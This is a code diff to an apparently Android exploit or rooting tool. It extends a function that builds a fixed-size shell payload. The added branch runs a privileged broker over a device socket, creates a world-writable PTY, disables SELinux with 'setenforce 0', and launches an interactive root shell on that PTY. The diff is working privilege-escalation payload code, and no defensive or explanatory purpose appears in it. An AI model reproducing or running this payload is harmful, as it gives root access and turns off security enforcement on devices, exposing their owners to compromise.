@@ -178,11 +178,24 @@ def wait_for_ping(port: int, timeout: float) -> bool:
     return False
 
 
-def broker_payload(shell_path: str) -> str:
-    script = (
-        "#!/system/bin/sh\n"
-        f"exec {BROKER_DEV} --socket {SOCKET_DEV} --shell {shell_path}\n"
-    )
+def broker_payload(shell_path: str, use_relay: bool = True) -> str:
+    if use_relay:
+        script = (
+            "#!/system/bin/sh\n"
+            "PTY_OUT=/data/local/tmp/root_pty_name\n"
+            "rm -f $PTY_OUT\n"
+            f"{BROKER_DEV} --socket {SOCKET_DEV} --allocate-pty-out $PTY_OUT &\n"
+            "while [ ! -s $PTY_OUT ]; do sleep 0.1; done\n"
+            "PTY=$(cat $PTY_OUT)\n"
+            "chmod 666 $PTY\n"
+            "setenforce 0\n"
+            "setsid sh -c \"exec sh -i < $PTY > $PTY 2>&1\" &\n"
+        )
+    else:
+        script = (
+            "#!/system/bin/sh\n"
+            f"exec {BROKER_DEV} --socket {SOCKET_DEV} --shell {shell_path}\n"
+        )
     if len(script) > PAYLOAD_SIZE:
         raise ShellError(f"broker payload exceeds {PAYLOAD_SIZE} bytes")
     return script.ljust(PAYLOAD_SIZE)
